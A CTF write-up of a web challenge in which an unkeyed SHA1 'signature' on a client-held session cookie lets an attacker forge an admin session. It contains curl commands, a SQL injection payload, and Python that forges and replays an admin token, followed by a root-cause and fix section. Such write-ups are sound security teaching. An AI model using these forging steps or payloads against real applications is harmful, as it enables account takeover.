# Broken Authentication — PentestGarage CTF Writeup

**Target:** `ctf-akshay-broken-auth-2924414b.challenges.pentestgarage.com:80`
**Category:** Web Security
**Flag:** `ctf{ev3ry_th!ng_i5_br0k3n}`

## Summary

The application issues a custom, hand-rolled session token instead of using
PHP's built-in session handling. The token is meant to act as a signed
(tamper-proof) blob of user data, but the "signature" is just an **unkeyed
SHA1 hash of the payload itself** — i.e. a checksum, not a MAC. Since there
is no server-side secret involved, anyone can compute a valid signature for
any payload they like, including one that sets `"admin":1` for the
`admin` account. This is a textbook broken-authentication / broken
session-management flaw (OWASP A07).

## Recon

The login page posts to `/index.php` with a `username`/`password` form and
two submit buttons (`login`, `register`) hitting the same endpoint.

```bash
curl -s http://<target>/ | tee page.html
```

`robots.txt` returned a plain 404, revealing the stack: `Apache/2.4.41 (Ubuntu)`.

## Step 1 — Register and log in as a throwaway user

```bash
curl -s -c cookies.txt -X POST http://<target>/index.php \
  -d "username=testuser1&password=testpass1&register=Register"

curl -s -c cookies.txt -X POST http://<target>/index.php \
  -d "username=testuser1&password=testpass1&login=Login" -v
```

Login returned a `Set-Cookie: session=...` value. Base64-decoding it revealed
the structure:

```
{"username":"testuser1","admin":0}.c769657882139fcf33c4bbae7d3ca14577ceffe3
```

A JSON payload, a literal `.`, and a 40-hex-character string — the length of
a SHA1 digest. The presence of an `admin` flag directly inside the
client-held token is the first red flag: privilege state is being trusted
from the client.

## Step 2 — Rule out the easy bypasses

- **Naive tampering:** flipping `"admin":0` → `"admin":1` while keeping the
  original signature was rejected (redirected back to the login page).
  This confirmed the signature *does* cover the full payload, ruling out a
  partial-signing bug.
- **Mass assignment:** POSTing an extra `admin=1` field at registration had
  no effect — the field is ignored server-side.
- **SQL injection:** classic `' OR '1'='1'-- -` payloads in the username
  field returned "Invalid Credentials," suggesting parameterized queries.
- **Dictionary/brute-force attack on a secret key:** captured two known
  `(payload, signature)` pairs by registering two accounts, then tried to
  crack an assumed `sha1(secret + payload)` scheme against ~1,000,000+
  common passwords and CTF-typical secrets. No match — this ruled out a
  short/guessable HMAC-style secret.

## Step 3 — The actual vulnerability: no secret at all

With two known plaintext/signature pairs in hand, the critical test was
simple: is the "signature" just `sha1(payload)` with **no secret whatsoever**?

```python
import hashlib
data0   = '{"username":"testuser1","admin":0}'
target0 = 'c769657882139fcf33c4bbae7d3ca14577ceffe3'

hashlib.sha1(data0.encode()).hexdigest() == target0   # True!
```

Confirmed against both captured samples. The server is computing
`sha1(json_payload)` and treating that as an integrity check — but since no
secret is mixed in, **anyone can generate a valid "signature" for any
payload they choose.**

## Step 4 — Forge an admin session

Registration already told us `admin` is a real, existing account
(`"User already exists"` on `POST /index.php` with `username=admin`), so we
just need a valid-looking token for it:

```python
import hashlib, base64

forged_data = '{"username":"admin","admin":1}'
forged_sig  = hashlib.sha1(forged_data.encode()).hexdigest()
raw_cookie  = forged_data + '.' + forged_sig
cookie      = base64.b64encode(raw_cookie.encode()).decode()
# => eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOjF9LjEwZWVkOGNiNGYxMWIzMmJiODI1MGEyYjU4NjgyNzFjODk4NmZlZDY=
```

## Step 5 — Use the forged cookie

```bash
curl -s -b "session=eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOjF9LjEwZWVkOGNiNGYxMWIzMmJiODI1MGEyYjU4NjgyNzFjODk4NmZlZDY=" \
  http://<target>/dashboard.php
```

Response:

```
Hello admin
Here is your flag: ctf{ev3ry_th!ng_i5_br0k3n}
```

## Root cause & fix

- **Root cause:** using a bare, unkeyed hash (`sha1(data)`) as if it were a
  cryptographic signature. A hash alone provides *no* authenticity guarantee
  — it just proves the attacker computed the hash correctly, which they can
  always do since the algorithm is public.
- **Fix:** use a proper keyed MAC with a server-only secret, e.g.
  `hash_hmac('sha256', $payload, SERVER_SECRET)`, verified with a
  constant-time comparison (`hash_equals()` in PHP). Even better: rely on
  PHP's native `$_SESSION` mechanism (server-side session storage) instead
  of round-tripping privilege data through the client at all.
- Also worth fixing independently: the client should never be the source of
  truth for an `admin`/role flag in the first place — that should be looked
  up server-side from the database on every request.
